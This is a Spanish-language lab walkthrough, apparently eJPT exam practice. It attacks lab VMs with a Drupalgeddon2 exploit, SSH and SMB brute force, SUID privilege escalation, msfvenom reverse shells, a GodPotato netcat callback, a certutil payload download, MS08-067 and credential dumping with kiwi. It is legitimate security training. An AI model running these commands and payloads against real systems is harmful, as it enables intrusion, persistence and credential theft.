---
title: "La ruta secreta para la certificación eJPT"
date: 2026-05-14 21:47:00 -0500
categories: [Pentesting, Windows Security, Post-Exploitation]
tags: [Metasploit, BadBlue, Pivoting, RDP, Privilege Escalation, Hydra, SSH, Meterpreter, msfvenom]
description: "Guía completa de laboratorios: explotación de BadBlue, técnicas de pivoting, persistencia con RDP y escalación de privilegios en Windows."
toc: true
---

# La ruta secreta para la certificación eJPT
En este laboratorio se procede a realizar una simulación a la prueba eJPTA, para ello se configura las maquinas de la siguiente manera
* Kali VMnet2 NAT
* DC1 2 interfaces VMnet2 NAT y VMnet15
* Robot 2 interfaces VMnet2 NAT
* metasploitable3 VMnet15
* Windows Server 2019 VMnet2 NAT
* Gift VMnet15
* doc VMnet2 NAT
* synfonos VMnet2 NAT
* Windows XQP VMnet2 NAT

De esa manera se debe configurar las interfaces de las máquinas y ahora si se procede a escanear todo con Kali Linux.

## Equipo 1 - DRUPAL
### Identificación de equipos
```shell
ip add
    192.168.100.128/24
```
Lo siguiente es reconocer los host que están en la red
```shell
arp-scan --localnet
```
![ARP SCAN](/assets/img/Primer-Blog/ruta-secreta/arp.png){: width=auto }
_arp-scan_
En la imagen se puede apreciar que VMWare genera 3 ips para su funcionamiento que en este caso son la .1 .2 y .254, máquinas que inician con la dirección 00:0c son de VMWare.
Para ser organizado se debe empezar creando un archivo
```shell
nano hosts_dmz.txt
    192.168.100.129
    192.168.100.131
    192.168.100.134
    192.168.100.133
    192.168.100.136
    192.168.100.140
```
Si no se tiene la opción de arp-scan, utilizamos nmap
```shell
nmap -sn 192.168.100.128/24
```
Con ese comando nos detecta nuestra propia dirección de la máquina kali.
```shell
sudo netdiscover -r 192.168.100.128/24
```
De esta manera tenemos 3 formas distintos de reconocer la red.

### Identificar nombres de quipos
Para saber los nombres que tiene cada equipo con el servicio SMB habilitado, se procede con:
```shell
crackmapexec smb 192.168.100.0/24
```
![Crackmapexec](/assets/img/Primer-Blog/ruta-secreta/crackmapexec.png){: width=auto }
_crackmapexec_
En base al resultado, observamos que tenemos los equipos llamados:

```shell
nano host_names.txt
    192.168.100.1 LAPTOP-DR11V3GT
    192.168.100.134 CRISV-AC8148ECD
    192.168.100.134 KHO
    192.168.100.131 SIMPLE
```

### Identificar puertos del host 192.168.100.129
Ahora debemos ir revisando que puertos están activos en cada host.
```shell
nmap -p- 192.168.100.129
    22/tcp open
    80/tcp open
    111/tcp open
    57606/tcp open
namp -p22,80,111,57606 -sVC -T5 192.168.100.129 -o host_129.txt
```
Para saber que es lo que tenemos con telnet hacemos una pequeña conexión
```shell
telnet 192.168.100.129 111
telnet 192.168.100.129 5706
telnet 192.168.100.129 22
    #SSH-2.0-OPENSSH_6.0P1
```
Con lo que hemos revisado ya sabemos que la máquina es una DRUPAL 7, por lo que abrimos en el navegador
![Drupal](/assets/img/Primer-Blog/ruta-secreta/drupal.png){: width=auto }
_drupal_

Drupal es un gestor de contenido similar a Wordpress pero hasta ahora no tenemos la versión exacta.
```shell
seachsploit drupal 7.57
```
![Searchsploit](/assets/img/Primer-Blog/ruta-secreta/searchsploit.png){: width=auto }
_searchsploit_
El resultado nos indica que 
* tenemos un script que requiere AUTHENTICACIÓN
* Vulenerabilidades REMOTE CODE
* El path si es de forma LOCAL, significa que previamente debía haber accedido de Forma Remota para luego escalar privilegios.
* La extensión RB es de Rubí y esos son para metasploit.

Ahora procedemos a copiarnos el exploit
```shell
searchsploit -m 44448
```
Con eso hacemos una copia, con el cuál debemos leer para saber los parámetros que requerimos pasarle. Para ejecutar se utiliza
```shell
python3 vlndrupal.py 192.168.100.129
    #Vuln
```
Ahora para utilizar los otros, procedemos con metasploit
```shell
msfconsole -q
    use uninx/webapp/drupal_drupalgeddon2
        set LPORT 1234
        set RHOST 192.168.100.129
        run
```
En caso de que el Drupal no se encuentre en la /, debemos cambiar el TARGETURI. Con lo que se configuró ya se abrió la sesión de meterpreter
```shell
getuid
    #www-data
ipconfig
    #Comando no soportado
```
> **Tip Profesional:** Siempre se debe poner ipconfig sea windows o linux, si no funciona, no podemos hacer pivoting.
{: .prompt-info }
```shell
shell
    ls
    cd /var/www
    find . -name settings.php
    cd /var/www/sites/default

    mysql -u dbuser -p
```
Esta shell da error porque no responde el comando de mysql. Para evitar eso mejoramos la shell con otro módulo de meterpreter
```shell
use /multi/manage/shell_to_meterpreter
    set session 1
    run

    session 2
        ipconfig
```
Con esta segunda shell ya permite hacer pivoting, ya que ipconfig si funciona.

### Enumeración de usuarios
PAra enumerar en la misma sesión utilizamos los siguientes comandos
```shell
cat /etc/passwd
```
Para saber que usuarios hay son los que tienen acceso a la shell /bin/bash

### Búsqueda de binarios SUID
```shell
find / -perm -u=s -type f 2>/dev/null
    binario find

find .  -exec /bin/sh \; -quit
    whoami
    #root
```

### Fuerza bruta ssh
Con el archivo passwd  podemos encontrar 2 usuarios, flag4 y root, para acceder podemos conectarnos mediante ssh y como no sabemos la clave, utilizamos **hydra**
```shell
hydra -l flag4 -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.100.129
hydra -t 16 -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.129
```
El resultado arroja orange
```shell
ssh flag4@192.168.100.129
    orange

    mysql -u dbuser -p
    R0ck3t

    show databases;
    use drupaldb;
    show tables;
    select * from users;
```
Conectandonos a la base de datos, podemos encontrar correos de los usuarios, contraseñas que se pueden descifrar con John
```shell
hashes.txt
    #Guardar los hashes encontrados
john hashes.txt
    #password
```
### SSH Clave pública y privada
Ahora esta máquina tiene una segunda interfaz, la cual nos permite hacer pivoting. Algo importante es generar una clave pública para generar persistencia cuando nos conectemos.
```shell
ssh-keygen -t rsa  -b 4096 -C "persistencia@EQUIPO1"
```
Con esta llaves nos permite conectarnos sin utilizar la contraseña
```shell
ssh-copy-id -i /home/kali/.ssh/id_rsa.pub flag4@192.168.100.129
```
Ahora simplemente accedemos y ya no nos solicita la contraseña.
```shell
ssh flag4@192.168.100.129
    cd .ssh
    cat authorized_keys
```

## Segunda máquina comprometida Windows
```shell
nmap -p- 1912.168.100.131 -v
nmap -p 80,139,445 -sVC -n -sS --min-rate 5000 192.168.100.131 -o host_131.txt
```
Si en obtenemos el puerto 445, se debe provar la siguiente vulnerabilidad
```shell
sudo nmap -p 445 --script=smb-vuln* --min-rate 5000 192.168.100.131 -o smb_vuln.txt
```
En este caso no se encontró ninguna vulnerabilidad.

Como el resultado del escaneo, arrojó el puerto 80, desde el navegador accedemos a la web y nos arroja 5 nombres, que debemos guardarnos en un archivo ya que provablemente pueden ser nombres de usuarios.
```shell
nano users.txt
    ruy
    marcos
    lander
    bogo
    viper
```
También se puede dejar corriendo un dirb para encontrar directorios
```shell
dirb http://192.168.100.131
```
Otro tip es probar con smbclient con contraseñas o de forma anónima
```shell
smbclient -L 192.168.100.131 -N
enum4linux 192.168.100.131
hydra -L users.txt -P users.txt smb://192.168.100.131
crackmapexec smb 192.168.100.131 -u useres -p users.txt
```
Con la fuerza bruta realizada con crackmapexec se encuentran credenciales, si solo aparece un **(+)** significa que podemos conectarnos a los directorios, en caso de que aparezca **!PWNED** significa que esas credenciales si nos sirve para conectarnos por SSH.
```shell
psexec.py bogo:bogo@192.168.100.131 #Al no ser credenciales válidas no logramos conectarnos a la shell
smbclient -L 192.168.100.131 -U bogo #Listado de recursos compartidos
smbclient -L //192.168.100.131/LOGS -U marcos 
```
Ahora podemos intentar subir una revshell pero hay que revisar que haya permisos de PUT, primero con un archivo de texto y este hay que intentar abrir desde el navegador. En caso de ejecutarse ya podemos subir una revshell.
Como estoy en un servidor windows, se debe subir una revshelll aspx.
Para ello nos apoyamos de la web [Revshells](https://revshells.com) y escogemos lo siguiente:
* MSFVenom
* Windows Staged ASPX Reverse TCP

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.128 LPORT=9002 -f aspx -o reverse.aspx
smbclient -L //192.168.100.131/LOGS -U marcos
    put reverse.aspx

msfconsole -q
use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost 192.168.100.128
    set lport 9002
    run
```
Desde el navegador buscamos a reverse.aspx lograremos abrir la sesión.
```shell
getuid
getsystem
get privs
    SeImpersonatePrivilege
Ctrl+Z
```

Ahora vamos a aprovechar el **SeImpersonatePrivilege** con ayuda de msfconsole
```shell
use /exploit/windows/local/ms16_075_reflection_juicy
    set payload windows/x64/meterpreter/reverse_tcp
    set session 1
    run
```
En este caso no funcionó, así que probamos otro método regresando a la sesión
```shell
session 1
shell
    dir
    cd c:\Users\Public\Downloads #En este caso ya tenemos goodpotato subido.
    GodPotato-NET4.exe -cmd "nc.exe cmd 192.168.100.128 9797"

#En otra shell
rlwrap nc -nlvp 9797
    whoami
        nt authority\system
    certutil.exe -f -split -utlcache "https://192.168.100.128/reverse.exe reverse.exe" #Nos descargamos del servidor pythone que está a continuación
    reverse.exe
```
Para escalar privilegios tenemos varios binarios como GodPotato, PrintSpoofer, Juicy_potato. En este caso ocupamos GodPotato

Ahora como ya accedimos a linux pero no mediante una sesión meterprete, debemos cambiar la shell y para ello nos apoyamos de (Revshells)[https://revshells.com] con los siguientes parámetros:
* Windows Meterpreter staged Reverse TCP (x64)

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.128 LPORT=9001 -f exe -o reverse.exe
python3 -m http.server 80

msfconsole -q
use exploit/multi/handler
    set payload windows/x64/meterpereter/reverse_tcp
    set lhost 192.168.100.128
    set lport 9001
    run
        getuid
            #NT Authority System
        ipconfig
        hashdump #hashes de usuarios
nano hashes.txt
    #Copiar y pegar
cat -d ":" -f 4 hashes.txt    
```
Con esa combinación de los hashes podemos colocar todos en crackstation para ver cuáles puede descifrar.
![Crackstation](/assets/img/Primer-Blog/ruta-secreta/crackstation.png){: width=auto }
_crackstation_

Al tener meterpreter activo ahora procedemos a utilizar el módulo **KIWI** dentro de meterpereter para sacar los hashes NTLM
```shell
load kiwi
    help
creds_wdigest
creds_all
getuid
lsa_dump_sam
```
Aunque la misma información se saca con HashDump y con esto terminamos de comprometer el segundo equipo.

Preguntas que hacen en la certificación es cuántos parches se han instalado en el equipo y para ver esos parches
```shell
meterpreter> shell
    systeminfo
    net user
    net localgroup
    wmic qfe list full
```

## Tercera máquina comprometida Windows XP
Primero empezamos con un ping para saber que equipo es:
```shell
ping 192.168.100.134
nmap --scrip smb-vuln* 192.168.100.134
crackmapexec smb 192.168.100.134
    #Arquitectura de x32 bits

msfconsole -q
    search ms08-067

    use exploit/windows/smb/ms08_067_netapi
        set lport 4142
        set rhost 192.168.100.134
        run
```
Con esto accedemos a meterpreter, al ser una máquina Windows Xp tiene muchas vulnerabilidades.
```shell
getuid
hashdump

nano hashes.txt
cat -d ":" -f 4 hashes.txt

load kiwi
    creds_wdigest
    creds_all
```
Con el listado ya podemos copiar a crackstation para tener los hashes listos. Como no encontramos usuarios pero ya tenemos acceso root, podemos crearnos un nuevo usuario desde cmd.
```shell
shell
    net user alvaro password
```
Al hacer nuevamente **Creds_all** dentro del módulo Kiwi, encontramos la contraseña ya que windows xp sabía almacenar las contraseñas en texto plano.
Con eso terminamos esta máquina y simplementa queda explorar los directorios.
